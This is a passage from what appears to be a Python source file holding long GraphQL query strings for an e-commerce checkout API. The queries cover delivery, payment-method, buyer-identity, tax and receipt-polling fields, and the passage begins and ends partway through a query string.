merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

# QUERY_POLL
QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl 